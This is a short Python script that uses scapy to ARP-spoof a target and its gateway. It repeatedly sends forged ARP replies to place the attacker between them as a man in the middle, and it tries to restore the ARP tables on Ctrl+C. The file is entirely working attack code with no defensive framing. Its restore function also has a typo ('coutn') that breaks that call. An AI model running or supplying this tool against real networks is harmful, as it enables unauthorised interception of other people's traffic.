import scapy.all as scapy
from time import sleep


def get_mac(ip):
  arp_req = scapy.ARP(pdst=ip)
  broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
  arp_req_broadcast = broadcast/arp_req
  answered = scapy.srp(arp_req_broadcast, timeout=1, verbose=False)[0]
  return answered[0][1].hwsrc


def spoof(target_ip, spoof_ip):
  target_mac = get_mac(target_ip)
  packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
  scapy.send(packet, verbose=False)


def restore(dest_ip, src_ip):
  dest_mac = get_mac(dest_ip)
  src_mac = get_mac(src_ip)
  packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=src_ip, hwsrc=src_mac)
  scapy.send(packet, coutn=4, verbose=False)

def main():
  try:
    target_ip = input("target ip: ")
    gateway_ip = input("gateway ip: ")
    sended_packets = 0
    while True:
      spoof(target_ip, gateway_ip)
      sended_packets = sended_packets + 1
      spoof(gateway_ip, target_ip)
      sended_packets = sended_packets + 1
      print("\r[+] Sended packets:" + str(sended_packets), end="")
      sleep(2)
  except KeyboardInterrupt:
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
    print("\n[-] CTRL + C")

if __name__ == "__main__":
  main()